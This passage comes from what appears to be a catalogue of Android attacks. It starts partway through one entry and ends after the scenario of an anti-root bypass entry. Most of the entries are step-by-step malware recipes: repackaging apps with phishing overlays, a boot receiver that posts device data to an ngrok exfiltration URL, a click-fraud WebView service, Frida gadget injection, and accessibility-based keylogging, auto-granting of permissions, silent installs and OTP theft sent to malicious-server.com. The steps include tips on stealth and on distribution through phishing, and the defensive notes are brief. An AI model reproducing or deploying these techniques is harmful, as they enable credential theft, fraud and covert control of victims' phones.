- **Scenario**: In this attack, the attacker clones a legitimate app, adds the SYSTEM_ALERT_WINDOW permission, and injects a malicious floating UI overlay on top of legitimate apps (e.g., banking, email). This overlay captures sensitive inputs like passwords or OTPs. Since it appears visually identical to the target app, victims often can't tell the difference.
- **Attack Steps**: 1. Choose a Legitimate Target App: – Download a popular app (e.g., Gmail, UPI app, Paytm) APK.2. Decompile Using Apktool: bash<br> apktool d original_app.apk -o repackaged_overlay_app<br> 3. Add SYSTEM_ALERT_WINDOW Permission: – Open AndroidManifest.xml in the decompiled folder. – Add the following inside <manifest> tag: xml<br> <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/> <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/><br> 4. Modify App Code to Display Overlay: – In MainActivity.smali or MainActivity.java: – Add Java code: java<br> if (Settings.canDrawOverlays(this)) {<br> WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);<br> View overlayView = LayoutInflater.from(this).inflate(R.layout.fake_login, null);<br> WindowManager.LayoutParams params = new WindowManager.LayoutParams(<br> WindowManager.LayoutParams.MATCH_PARENT,<br> WindowManager.LayoutParams.MATCH_PARENT,<br> WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,<br> WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,<br> PixelFormat.TRANSLUCENT);<br> windowManager.addView(overlayView, params);<br> }<br>  – The layout fake_login.xml should mimic the real login screen of the target app (e.g., input for username, password, OTP).5. Capture User Input from Overlay: – Add logic to save input values entered in overlay: java<br> Button loginBtn = overlayView.findViewById(R.id.btnLogin);<br> loginBtn.setOnClickListener(v -> {<br> String user = usernameField.getText().toString();<br> String pass = passwordField.getText().toString();<br> sendToServer(user, pass);<br> });<br> 6. Rebuild the APK: bash<br> apktool b repackaged_overlay_app -o final_overlay_app.apk<br> 7. Sign the APK: bash<br> keytool -genkey -v -keystore overlaykey.keystore -alias overlaykey -keyalg RSA -keysize 2048 -validity 10000<br> jarsigner -verbose -keystore overlaykey.keystore final_overlay_app.apk overlaykey<br> zipalign -v 4 final_overlay_app.apk aligned_overlay.apk<br> 8. Install and Run: – Use adb install aligned_overlay.apk on emulator. – Open app. Grant permission for "Draw Over Other Apps". – Overlay should appear on top of home screen or login screens.9. Observe Credential Capture: – Enter dummy values in the fake overlay. – App should log or send these to remote endpoint.✅ Now the cloned app overlays sensitive UIs and phishes data without needing root or special privileges. Works especially well on older Android versions.
- **Detection**: Monitor draw-over-apps permission, system UI overlay logs, user behavior
- **Solution**: Block apps requesting overlay without reason, Android 10+ restricts overlays, enforce Play Store-only installations
- **Tags**: Overlay Phishing, SYSTEM_ALERT_WINDOW, Android UI Hijack, Repackaged Attack

## Add Data Exfiltration via BroadcastReceiver

- **Attack Type**: Repackaged App with Broadcast Data Leakage
- **Target**: Android APK
- **Vulnerability**: Lack of manifest validation, overly permissive receivers, boot broadcast
- **MITRE**: T1412 (Broadcast Receivers), T1406 (Code Injection), T1416 (Repackaging)
- **Impact**: Background data theft, silent PII exfiltration, long-term compromise
- **Tools**: Android Studio, apktool, ADB, Frida (optional), Android Emulator, keytool, jarsigner, zipalign, ngrok (for testing exfil server)
- **Scenario**: In this attack, a malicious BroadcastReceiver is added to a legitimate app during repackaging. This receiver listens for system broadcasts (e.g., BOOT_COMPLETED, SMS_RECEIVED) and, when triggered, exfiltrates sensitive data (SMS, device ID, contact list, etc.) to an attacker-controlled server in the background. The original app works as usual, making detection difficult.
- **Attack Steps**: 1. Choose a Target App for Repackaging: – Download a basic app from APKMirror or use a test app.2. Decompile APK with Apktool: bash<br> apktool d target.apk -o decompiled_app<br> 3. Create a Malicious BroadcastReceiver Class (Java): – In Android Studio, create a simple class: java<br> public class BootReceiver extends BroadcastReceiver {<br> @Override<br> public void onReceive(Context context, Intent intent) {<br> if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {<br> String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);<br> String phone = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();<br> String payload = "Device: " + deviceID + ", Phone: " + phone;<br> sendToAttacker(payload);<br> }<br> }<br><br> public void sendToAttacker(String data) {<br> try {<br> URL url = new URL("http://your-ngrok-url.ngrok.io/exfil");<br> HttpURLConnection conn = (HttpURLConnection) url.openConnection();<br> conn.setRequestMethod("POST");<br> conn.setDoOutput(true);<br> OutputStream os = conn.getOutputStream();<br> os.write(("data=" + data).getBytes());<br> os.flush(); os.close();<br> conn.getResponseCode();<br> } catch (Exception e) { e.printStackTrace(); }<br> }<br> }<br> 4. Convert to .smali (or use compiled class): – Compile it into .dex, convert to .smali, and copy to: decompiled_app/smali/com/malicious/BootReceiver.smali5. Modify AndroidManifest.xml: – Add inside <application> tag: xml<br> <receiver android:name="com.malicious.BootReceiver" android:enabled="true" android:exported="true"><br> <intent-filter><br> <action android:name="android.intent.action.BOOT_COMPLETED" /> <br> </intent-filter><br> </receiver><br> <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/> <br> <uses-permission android:name="android.permission.READ_PHONE_STATE"/> <br> 6. Rebuild and Sign APK: bash<br> apktool b decompiled_app -o exfil_app.apk<br> jarsigner -verbose -keystore mykeystore.keystore exfil_app.apk alias_name<br> zipalign -v 4 exfil_app.apk final_exfil.apk<br> 7. Setup Listener (Using Flask + Ngrok for Lab): python<br> from flask import Flask, request<br> app = Flask(__name__)<br><br> @app.route('/exfil', methods=['POST'])<br> def log():<br> print("Exfiltrated:", request.form['data'])<br> return "OK", 200<br><br> app.run(port=5000)<br>  – Run: ngrok http 50008. Install and Trigger on Emulator: – Install: adb install final_exfil.apk – Reboot emulator or send BOOT_COMPLETED intent: bash<br> adb shell am broadcast -a android.intent.action.BOOT_COMPLETED<br>  – You should see data printed in your Flask server.✅ You’ve now simulated a working data exfiltration attack triggered by system broadcast via a cloned Android app.
- **Detection**: Monitor receiver registrations, static analysis (MobSF), runtime logging
- **Solution**: Use Play Store apps only, detect apps requesting boot permissions, restrict exported receivers
- **Tags**: Broadcast Hijack, Data Exfiltration, Android Boot, Repackaged Malware

## App Cloning for Fake Ads / Click Fraud

- **Attack Type**: Repackaged App for Ad Click Fraud
- **Target**: Android APK
- **Vulnerability**: Ad SDKs injected via cloning, misuse of WebView, invisible UI
- **MITRE**: T1416 (App Repackaging), T1406 (Code Injection), T1436 (Ad Fraud)
- **Impact**: Financial fraud, background data usage, battery drain, user exploitation
- **Tools**: apktool, Android Studio, ADB, smali, keytool, jarsigner, zipalign, test device/emulator, dummy ad networks (e.g., test URLs)
- **Scenario**: The attacker clones a legitimate Android app and injects fake ad SDKs or invisible WebViews that perform automatic ad requests or fake ad clicks in the background. These clicks are sent to an ad network with the attacker’s publisher ID, generating revenue fraudulently. The victim unknowingly runs the app thinking it’s genuine, while it silently generates revenue for the attacker.
- **Attack Steps**: 1. Get a Legitimate Target App: – Download a free app’s APK (e.g., from APKPure).2. Decompile APK using Apktool: bash<br> apktool d original.apk -o fakead_app<br> 3. Prepare Malicious Code (Java/WebView): - Create a small AdService.java or use smali to auto-load ad clicks: java<br> public class AdService extends Service {<br> @Override<br> public int onStartCommand(Intent intent, int flags, int startId) {<br> WebView webView = new WebView(this);<br> webView.getSettings().setJavaScriptEnabled(true);<br> webView.setWebViewClient(new WebViewClient());<br> webView.loadUrl("https://attackeradserver.com/click?pubid=attacker123");<br> return START_STICKY;<br> }<br> @Override<br> public IBinder onBind(Intent intent) { return null; }<br> }<br> 4. Add AdService to AndroidManifest.xml: Inside <application> tag: xml<br> <service android:name=".AdService" android:enabled="true" android:exported="false"/> <br> <uses-permission android:name="android.permission.INTERNET"/> <br> 5. Trigger Service Automatically: - In MainActivity.smali or MainActivity.java, add: java<br> Intent i = new Intent(this, AdService.class);<br> startService(i);<br> 6. Rebuild the APK: bash<br> apktool b fakead_app -o fraud_app.apk<br> 7. Sign the APK: bash<br> keytool -genkey -v -keystore clickfraud.keystore -alias fraudkey -keyalg RSA -keysize 2048 -validity 10000<br> jarsigner -verbose -keystore clickfraud.keystore fraud_app.apk fraudkey<br> zipalign -v 4 fraud_app.apk final_fakead.apk<br> 8. Install and Monitor: - Use ADB: adb install final_fakead.apk - Launch app → observe hidden traffic via: adb logcat OR use Burp Suite to view HTTPS requests.✅ The cloned app now runs a fake background ad-clicking service every time the app is launched, resulting in click fraud without the victim’s knowledge.
- **Detection**: Network traffic analysis, CPU usage patterns, static code scan
- **Solution**: Block sideloaded apps, use Play Protect, disable unknown sources, analyze for injected SDKs
- **Tags**: Click Fraud, Fake Ads, WebView Exploit, Ad Revenue Scam, App Cloning

## Injecting Frida Gadget for Runtime Hooking

- **Attack Type**: App Cloning with Dynamic Instrumentation
- **Target**: Android APK
- **Vulnerability**: Runtime memory hook injection, library abuse
- **MITRE**: T1406 (Code Injection), T1416 (Repackaging), T1410 (Dynamic Code)
- **Impact**: Real-time credential theft, app logic bypass, code tampering
- **Tools**: apktool, Frida Gadget, Android Studio, adb, keytool, jarsigner, zipalign, ngrok, Frida, objection, test device/emulator
- **Scenario**: In this technique, an attacker repackages an Android APK to include Frida Gadget — a dynamic instrumentation library. When the app runs, the embedded Frida Gadget starts a listener, allowing the attacker to hook internal functions, bypass root detection, read memory, intercept function parameters, etc., without modifying original app logic. This is powerful for app reverse engineering and credential stealing in real time.
- **Attack Steps**: 1. Get the Target APK: - Download an app APK (e.g., from APKPure) or use your test app.2. Decompile the APK Using Apktool: bash<br> apktool d target_app.apk -o frida_injected_app<br> 3. Download Frida Gadget Library (.so): - Get the .so library for your target architecture: https://github.com/frida/frida/releases - Example: libfrida-gadget.so for armeabi-v7a4. Place the .so in the APK lib Folder: - Copy libfrida-gadget.so to: frida_injected_app/lib/armeabi-v7a/5. Modify AndroidManifest.xml: - No change needed if injecting silently.6. Modify smali to Load Frida Gadget: - Edit smali/com/example/MainActivity.smali (or Application class): Add in onCreate: smali<br> const-string v0, "frida-gadget"<br> invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V<br>  This loads libfrida-gadget.so when the app starts.7. Create Frida Config File: - In root of assets folder, add libfrida-gadget.config: json<br> {<br> "interaction": {<br> "type": "listen",<br> "address": "0.0.0.0",<br> "port": 27042,<br> "on_load": "scripts/hook.js"<br> }<br> }<br>  (You can skip "on_load" if using Frida CLI to connect manually.)8. Rebuild the APK: bash<br> apktool b frida_injected_app -o frida_ready.apk<br> 9. Sign the APK: bash<br> keytool -genkey -v -keystore gadget.keystore -alias gadgetkey -keyalg RSA -keysize 2048 -validity 10000<br> jarsigner -verbose -keystore gadget.keystore frida_ready.apk gadgetkey<br> zipalign -v 4 frida_ready.apk final_frida_injected.apk<br> 10. Install the APK and Start Listener: bash<br> adb install final_frida_injected.apk<br> adb forward tcp:27042 tcp:27042<br> frida-trace -n com.example.app<br> 11. Start Hooking Functions: - Use Frida CLI or Objection: bash<br> objection -g com.example.app explore<br>  - Hook methods: js<br> Java.perform(function() {<br> var LoginClass = Java.use("com.example.LoginActivity");<br> LoginClass.checkLogin.implementation = function(u, p) {<br> console.log("Hooked Login →", u, p);<br> return this.checkLogin(u, p);<br> }<br> });<br> ✅ You now have a repackaged app that secretly runs Frida Gadget, enabling full runtime hooking on any internal logic of the app.
- **Detection**: Detect libfrida-gadget.so, inspect .smali loads, check open ports
- **Solution**: Use SafetyNet, detect Frida presence, verify APK signature at runtime, enforce Play Store integrity
- **Tags**: Frida Gadget, Runtime Hooking, Dynamic Analysis, App Instrumentation

## Keylogging via Accessibility Events

- **Attack Type**: Abusing Accessibility Services → Keylogging via Accessibility Events
- **Target**: Android Devices
- **Vulnerability**: Abuse of Accessibility APIs, Lack of User Awareness, Over-Permissive Accessibility System
- **MITRE**: T1056.001 (Input Capture via Accessibility Features)
- **Impact**: Exfiltration of sensitive input data, including passwords, OTPs, and private messages. High risk of identity theft, account compromise, and financial fraud.
- **Tools**: Android Studio, Kali Linux (for reverse shell server or listener), MITMproxy or Burp Suite (optional for monitoring exfiltrated data), Custom malicious APK with AccessibilityService
- **Scenario**: In this scenario, a malicious Android app requests Accessibility Service permissions under the guise of a legitimate utility (e.g., battery optimizer, file cleaner). Once granted, it starts monitoring UI interaction events like TYPE_VIEW_TEXT_CHANGED, TYPE_VIEW_CLICKED, and TYPE_WINDOW_CONTENT_CHANGED, which reveal input field changes and text typed by the user. These events are logged and silently transmitted to the attacker’s server, effectively turning the app into a keylogger. This exploit works without needing root access and bypasses most traditional permission alerts, making it stealthy and dangerous.
- **Attack Steps**: 1. Open Android Studio and create a new Android app with a deceptive purpose (e.g., "Battery Booster"). 2. Modify the AndroidManifest.xml to include the android.permission.BIND_ACCESSIBILITY_SERVICE permission and create an Accessibility Service by extending AccessibilityService class. 3. In the service’s configuration XML, request event types: TYPE_VIEW_TEXT_CHANGED, TYPE_VIEW_FOCUSED, and TYPE_WINDOW_CONTENT_CHANGED. Set packageNames to "*", so events from all apps are captured. 4. In onAccessibilityEvent(), implement logging logic to record all incoming event.getText() and UI event types, optionally tagging fields like “username” or “password”. 5. Save logs locally in SharedPreferences or SQLite. Optionally implement a background thread that periodically uploads data via HTTP POST to a remote server controlled by the attacker. 6. Package and sign the APK using keytool and jarsigner, then deploy it via USB, phishing link, or fake app store. 7. On victim's device, once the app is installed, prompt user to enable Accessibility Services with misleading UI (e.g., “Tap here to enable advanced features”). 8. Once enabled, the service starts listening to all keyboard inputs across apps including credentials, messages, and sensitive info. 9. Attacker monitors remote server to view all captured input in real time or delayed log dump. 10. (Optional) Use MITMproxy or Burp Suite on attacker device to inspect exfiltrated logs in transit if using unsecured endpoints.
- **Detection**: Monitoring Accessibility logs, Unusual Accessibility Service usage, Battery consumption anomalies, Apps with unnecessary Accessibility permissions
- **Solution**: 1. Use Android 13+ which prompts additional warnings for Accessibility misuse. 2. Regularly audit installed apps for unnecessary Accessibility access. 3. Use behavior-based mobile antivirus and endpoint monitoring tools. 4. Restrict sideloading or use Play Protect to flag suspect apps. 5. Implement runtime accessibility restrictions at OS level for critical apps like banking.
- **Tags**: keylogger, accessibility abuse, Android malware, mobile spyware, keylogging events, mobile phishing, keyboard hijack

## Permission Auto-Grant / Click Injection

- **Attack Type**: Abusing Accessibility Services → Click Injection
- **Target**: Android Phones
- **Vulnerability**: Misuse of Accessibility for UI Automation, Over-permissive system trust in Accessibility Services, User deception
- **MITRE**: T1546.008 (Accessibility Features Abuse), T1202 (Indirect Command Execution via UI), T1068 (Permission Abuse)
- **Impact**: Silent granting of sensitive permissions, full surveillance access, device compromise without root, user unawareness, app privilege escalation
- **Tools**: Android Studio, AccessibilityService APIs, Kali Linux (optional for data exfiltration), Custom-built APK, adb (optional for install), ApkTool (to analyze accessibility behavior of existing malware), Wireshark or Burp Suite (to monitor data flow)
- **Scenario**: In this attack, a malicious Android app silently gains dangerous permissions (like camera, location, or contacts) by simulating user interactions using Accessibility Services. The app waits for the system settings screen to appear and automatically clicks the right buttons (“Allow”, “Grant”, “OK”) without any user interaction. It exploits how Accessibility Services can perform performGlobalAction() and dispatchGesture() to simulate clicks. This allows privilege escalation and full device compromise without rooting the phone or alerting the user with permission dialogs. This is often used by spyware or surveillanceware apps to gain permissions stealthily.
- **Attack Steps**: 1. Open Android Studio and create a new Android app posing as a system optimizer, cleaner, or flashlight tool to mislead users. 2. Declare the Accessibility Service in AndroidManifest.xml with <service android:name=".AutoClickService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">. 3. Create a service class that extends AccessibilityService. In the service configuration XML, declare all event types (TYPE_WINDOW_STATE_CHANGED, TYPE_VIEW_CLICKED, TYPE_VIEW_TEXT_CHANGED) and set packageNames="*" to monitor all apps. 4. In the onAccessibilityEvent() method, add logic to detect when the user navigates to the App Settings screen (check event.getClassName() for com.android.settings.applications.InstalledAppDetailsTop). 5. Once the right screen is detected, use AccessibilityNodeInfo to find UI buttons like “Allow”, “Grant”, “OK” and trigger click actions using node.performAction(AccessibilityNodeInfo.ACTION_CLICK). You can also simulate gestures via dispatchGesture() to perform swipes or clicks. 6. For permissions that launch confirmation dialogs (e.g., draw over other apps, access usage stats, install unknown apps), trigger click events on those specific elements using node text matching (e.g., node.getText().equals("Allow")). 7. Combine this logic with delayed execution (Handler.postDelayed) to avoid detection and seem more natural. 8. Package and sign the APK using jarsigner or a third-party tool. Install on a target test phone via adb or trick user into installing it via phishing, fake update prompts, or third-party app stores. 9. Ask user to grant Accessibility Service manually (required only once). Once enabled, the app will monitor all system UI and inject permission-grant clicks automatically in the background. 10. Once granted, permissions such as camera, microphone, storage, and location can be accessed by the malicious app without further prompts, allowing full surveillance or data theft. 11. Optionally, send the collected data to a remote server via HTTP using Retrofit or raw sockets. Use Wireshark or Burp Suite to observe traffic.
- **Detection**: Monitor Accessibility Service usage, check apps granted Accessibility in Settings, detect automatic UI actions, compare permission grant logs vs. user input, monitor apps requesting dangerous permissions soon after Accessibility is granted
- **Solution**: 1. Never grant Accessibility to unknown or non-assistive apps. 2. Use Android 13+ which places stricter rules and user-visible warnings. 3. Restrict side-loading apps from untrusted sources. 4. Implement MDM controls to audit app permissions in enterprise phones. 5. Use behavior-based mobile EDR/antivirus apps to detect synthetic clicks and injected gestures. 6. Developers: Use AccessibilityServiceInfo.FLAG_REQUEST_ACCESSIBILITY_BUTTON for legit accessibility use and prevent abuse.
- **Tags**: android click injection, accessibility abuse, mobile spyware, auto-permission grant, android malware, gesture injection, mobile security

## Overlay Phishing (Screen Hijack)

- **Attack Type**: Abusing Accessibility Services → Overlay Phishing
- **Target**: Android Smartphones
- **Vulnerability**: Abuse of Accessibility APIs and Overlay Permissions, UI Spoofing
- **MITRE**: T1056.002 (Input Capture via UI Overlay), T1566.002 (User Interface Spoofing), T1546.008 (Accessibility Feature Abuse)
- **Impact**: Theft of sensitive login credentials, banking fraud, identity theft, bypass of 2FA prompts, full account compromise
- **Tools**: Android Studio, APKTool (optional for reverse engineering), Kali Linux (for testing server), MITMproxy or Burp Suite (for monitoring exfiltration), AccessibilityService API, SYSTEM_ALERT_WINDOW permission, ADB
- **Scenario**: In this attack, a malicious app uses Android's SYSTEM_ALERT_WINDOW or AccessibilityService to display fake UI screens that mimic legitimate apps (e.g., login screens for banking, email, Facebook, etc.) on top of real applications. The attacker tricks users into entering sensitive credentials into these fake UI layers while believing they are interacting with the legitimate app. Accessibility Services are used to detect which app is open (e.g., banking app) and instantly trigger an overlay designed to match its appearance. Inputs are then captured and exfiltrated. The attack is often used by banking trojans and spyware, and doesn't require root access.
- **Attack Steps**: 1. Open Android Studio and create a fake utility app (e.g., “Battery Manager” or “Speed Booster”) to deceive users. 2. In AndroidManifest.xml, request permissions: android.permission.SYSTEM_ALERT_WINDOW, android.permission.BIND_ACCESSIBILITY_SERVICE, and any others needed for phishing (e.g., Internet). 3. Create a background AccessibilityService class that listens for TYPE_WINDOW_STATE_CHANGED or TYPE_WINDOW_CONTENT_CHANGED events. 4. In the onAccessibilityEvent() method, monitor the foreground app package name (e.g., com.android.chrome, com.google.android.gm, com.google.android.apps.authenticator2, com.google.android.apps.walletnfcrel, com.facebook.katana, com.whatsapp, etc.). 5. When a target app is detected (like a banking app), immediately launch a full-screen Activity or floating window that mimics the app’s login screen using the WindowManager API. Match the UI exactly: use same colors, icons, fonts, and fields (username, password, OTP, etc.). 6. Add input fields and a submit button. When user types into these fields, capture the input using EditText.getText() or log keystrokes in real time. 7. Prevent user from going back by blocking onBackPressed() or repeatedly relaunching the overlay window on onPause() using TYPE_WINDOW_STATE_CHANGED. 8. Send the captured credentials via HTTP POST or socket connection to a remote attacker-controlled server. Use Retrofit, Volley, or raw Java networking code. 9. Implement logic to dismiss the overlay after a few seconds or auto-redirect to the real app, so the user doesn’t suspect foul play. 10. Use adb to sideload the APK to a test device, or distribute it via phishing campaign or third-party app store. 11. Once the user installs the app and enables Accessibility Services, the phishing overlay becomes active and mimics target apps in real-time. 12. (Optional) Use MITMproxy or Wireshark to confirm credential exfiltration and analyze outgoing traffic from the victim device.
- **Detection**: Monitor for apps using SYSTEM_ALERT_WINDOW and Accessibility in combination, watch for background UI injection, track unusual activity patterns like overlays on secure apps, use behavior-based anomaly detection
- **Solution**: 1. Deny SYSTEM_ALERT_WINDOW to suspicious apps. 2. Never install apps from unknown sources or third-party app stores. 3. Regularly audit Accessibility permissions and disable for non-assistive apps. 4. Use Android 12+ which introduces overlay permission indicators and restrictions. 5. Developers of critical apps should use FLAG_SECURE to block screenshots and overlays. 6. Mobile EDR solutions can flag apps launching overlays over secure apps like banking.
- **Tags**: overlay attack, android phishing, accessibility abuse, screen hijack, login screen spoof, mobile malware, android trojan, mobile UI deception

## Silent App Install / Uninstall

- **Attack Type**: Abusing Accessibility Services → Silent App Install / Uninstall
- **Target**: Android Devices (mostly Android 7–12)
- **Vulnerability**: Abuse of Accessibility Service for UI automation, user deception, lack of runtime access verification
- **MITRE**: T1546.008 (Accessibility Feature Abuse), T1210 (Exploitation of Remote Services), T1202 (Indirect Execution via UI interaction)
- **Impact**: Stealthy installation of malware modules, deletion of security tools, full control over device software, persistence of attack
- **Tools**: Android Studio, AccessibilityService APIs, APKTool (to analyze samples), Custom malicious APK, Kali Linux (for server listener if remote control is involved), adb (for local testing), Burp Suite or MITMproxy (for monitoring outbound traffic)
- **Scenario**: In this attack, a malicious app abuses Android’s Accessibility Services to silently install or uninstall other apps on the device without the user’s explicit interaction. While Android does not allow silent install/uninstall via normal APIs without root, an app with Accessibility privileges can simulate user actions to click through installation and uninstallation dialogs. This is often used by trojans, adware, and mobile botnets to maintain persistence, install other malware modules, or remove security apps that could detect the threat. This does not require root access and works on Android 7–12 if accessibility permissions and unknown sources access are granted.
- **Attack Steps**: 1. Create a new Android app using Android Studio and name it something harmless (e.g., “Cleaner Booster” or “Battery Doctor”) to trick the user. 2. In AndroidManifest.xml, declare and request permissions: android.permission.REQUEST_INSTALL_PACKAGES, android.permission.BIND_ACCESSIBILITY_SERVICE, android.permission.INTERNET, and optionally android.permission.PACKAGE_USAGE_STATS. 3. Create a new service class that extends AccessibilityService. Configure the service XML file to listen to event types TYPE_WINDOW_STATE_CHANGED, TYPE_VIEW_CLICKED, and TYPE_VIEW_TEXT_CHANGED. 4. In onAccessibilityEvent(), detect when the device shows the package installer screen (e.g., class name: com.android.packageinstaller.InstallAppProgress, com.android.packageinstaller.UninstallAppProgress). Also monitor system UI with window titles like “Do you want to install this application?”, “Do you want to uninstall this app?”, etc. 5. When such windows are detected, use AccessibilityNodeInfo to traverse the UI tree and locate buttons with text “Install”, “Allow”, or “Uninstall”. Trigger the click using performAction(AccessibilityNodeInfo.ACTION_CLICK). 6. To install a new app, include an APK file in your app’s assets folder or download it at runtime from a remote server using DownloadManager. Once downloaded, launch an intent with Intent.ACTION_VIEW and set the MIME type as application/vnd.android.package-archive with setFlags(Intent.FLAG_ACTIVITY_NEW_TASK). This opens the Android Package Installer screen. 7. Your AccessibilityService immediately listens for that installer screen and auto-clicks “Install” button to complete the installation without real user interaction. 8. To uninstall an app silently, launch an uninstall intent using: Intent intent = new Intent(Intent.ACTION_DELETE); intent.setData(Uri.parse("package:<target_package>")); startActivity(intent); 9. Your AccessibilityService again detects the uninstallation prompt and auto-clicks “OK” or “Uninstall” button. 10. To make this stealthy, hide the main app icon by disabling the launcher activity after first launch using PackageManager. Optionally run the service in the background silently. 11. Collected data, installed apps, or command instructions can be sent to a C2 server using HTTP POST requests or MQTT. Use Burp Suite or Wireshark to inspect logs and verify silent installs or removals. 12. This results in installation of payload apps (spyware, adware, keyloggers), or uninstallation of antivirus or cleaner apps without the victim’s awareness. This can be repeatedly triggered by remote command or internal timer.
- **Detection**: Monitoring system logcat for frequent package installs/removals, checking Accessibility logs for UI automation during install screens, behavior-based detection for silent package operations, MDM logs or Play Protect alerts
- **Solution**: 1. Never grant Accessibility permission to apps not designed for assistive use. 2. Regularly review Accessibility access under Settings > Accessibility. 3. Disable “Install unknown apps” access for non-trusted apps. 4. Use mobile security tools with behavior analysis that monitor unauthorized install flows. 5. Android 13+ should be used as it includes better restrictions on accessibility-based automation. 6. Developers should use FLAG_SECURE and ActivityManager.isRunningInUserTestHarness() to detect overlay misuse.
- **Tags**: android silent install, accessibility abuse, uninstall spyware, android malware, click injection, mobile trojan, apk injection

## Extracting OTPs / 2FA Codes

- **Attack Type**: Abusing Accessibility Services → OTP / 2FA Capture
- **Target**: Android Smartphones
- **Vulnerability**: Insecure use of Accessibility Services to read dynamic text content, including OTP fields and notifications
- **MITRE**: T1056.001 (Input Capture via Accessibility), T1556.004 (Intercept Authentication Codes), T1546.008 (Accessibility Feature Abuse)
- **Impact**: Account takeover via OTP interception, SMS hijacking, bypassing 2FA protections, financial theft, user session hijack
- **Tools**: Android Studio, AccessibilityService APIs, NotificationListenerService (optional), Burp Suite or Wireshark (for data flow monitoring), ADB, Fake C2 Server (Python Flask or PHP endpoint), APKTool (optional for analyzing malware)
- **Scenario**: This attack involves a malicious Android app that abuses Accessibility Services to read one-time passwords (OTPs) or two-factor authentication (2FA) codes sent to the device via SMS or shown in notification popups. Even without SMS or Notification access permissions, the app can capture these sensitive codes by monitoring the contents of views and UI elements using AccessibilityEvent and AccessibilityNodeInfo. This method bypasses Android’s newer security restrictions and has been widely used by banking malware to hijack sessions and perform fraudulent logins.
- **Attack Steps**: 1. Open Android Studio and create a malicious app (e.g., “Flashlight Tool” or “Memory Cleaner”) that appears harmless to users. 2. In AndroidManifest.xml, request BIND_ACCESSIBILITY_SERVICE, INTERNET, and optionally RECEIVE_BOOT_COMPLETED to make the app auto-start. Do not request RECEIVE_SMS or READ_SMS so the app appears less suspicious. 3. Create an AccessibilityService class and in its service configuration XML, listen for TYPE_VIEW_TEXT_CHANGED, TYPE_WINDOW_CONTENT_CHANGED, and TYPE_NOTIFICATION_STATE_CHANGED. 4. In the onAccessibilityEvent() method, filter for events related to system UI, messaging apps (e.g., com.android.mms, com.google.android.apps.messaging, com.whatsapp, com.facebook.orca, etc.), or banking apps. Use event.getPackageName() to identify these. 5. When event.getText() contains keywords like “OTP”, “verification code”, or matches regex patterns like \d{4,6}, log that string. Use event.getText().toString() and match using Pattern.compile("\\b\\d{4,8}\\b"). 6. To capture from notifications (if Accessibility is not fast enough), optionally implement NotificationListenerService and extract extras.getCharSequence(Notification.EXTRA_TEXT) and parse the OTP. 7. Once captured, log the OTP into internal storage, shared preferences, or send to a C2 server using HTTP POST. Example: HttpURLConnection conn = (HttpURLConnection) new URL("http://malicious-server.com/otp").openConnection(); conn.setDoOutput(true); conn.getOutputStream().write(otp.getBytes()); 8. To maintain stealth, use a foreground service with an innocuous notification like “Running in background for optimization”. You can even delay the transmission of OTP to avoid immediate detection. 9. Package and sign the APK, sideload it using ADB for testing or distribute through phishing campaigns. Once the user installs and grants Accessibility, the service runs and listens passively to extract OTPs in real time. 10. You can test this by sending a test OTP SMS (e.g., “Your login OTP is 348291”) to the device and observe your app logging and/or exfiltrating it silently. 11. (Optional) For real-time phishing attacks, combine with WebView-based phishing screens to immediately use the OTP for logging in to target services (e.g., bank, email). 12. Use Wireshark or Burp Suite to intercept traffic going to the attack server and verify captured OTPs are successfully transmitted.
- **Detection**: Monitor apps using Accessibility and scanning for numeric strings from secure apps, review app permission mismatch (no SMS but OTP access), detect suspicious background network traffic after OTP reception
- **Solution**: 1. Never grant Accessibility to apps unrelated to assistive purposes. 2. Use Android 12+ which adds extra prompts and overlays for Accessibility usage. 3. Implement OTP auto-fill protections using FLAG_SECURE and restrict OTP content visibility. 4. Use 2FA apps like Google Authenticator instead of SMS when possible. 5. Use mobile EDR solutions that monitor for Accessibility event abuse or real-time OTP interception. 6. Developers: Do not expose OTPs in view hierarchy and use encrypted local storage for tokens.
- **Tags**: otp hijack, 2fa code theft, sms abuse, accessibility attack, android malware, phishing otp, mobile banking trojan

## Bypass App Restrictions / Anti-Root Checks

- **Attack Type**: Abusing Accessibility Services → UI Manipulation to Bypass Restrictions
- **Target**: Android Smartphones or Rooted Devices
- **Vulnerability**: Abuse of UI automation via Accessibility to bypass anti-root and security flags
- **MITRE**: T1556.004 (Bypass Authentication), T1546.008 (Accessibility Feature Abuse), T1218 (Signed Binary Proxy Execution), T1202 (Indirect Execution via UI Injection)
- **Impact**: Enables access to sensitive apps despite root status, defeats runtime security checks, allows data exposure or attack staging from rooted environments
- **Tools**: Android Studio, AccessibilityService API, Magisk (for root simulation if needed), Rooted Test Device (or Emulator), Burp Suite (optional), ApkTool (optional for analyzing app protections), ADB, Custom malicious APK
- **Scenario**: Many secure apps like banking, UPI, or payment wallets prevent access on rooted devices or prevent screenshots, screen readers, or screen overlays to protect sensitive data. Some apps also prevent access if screen recording is active. In this attack, a malicious app leverages Accessibility Services to manipulate the user interface and bypass these restrictions by injecting fake responses or simulating allowed conditions. This allows the attacker to force the app to continue running even on rooted devices, extract hidden information, or bypass security warnings, all without modifying the target app or having root access.
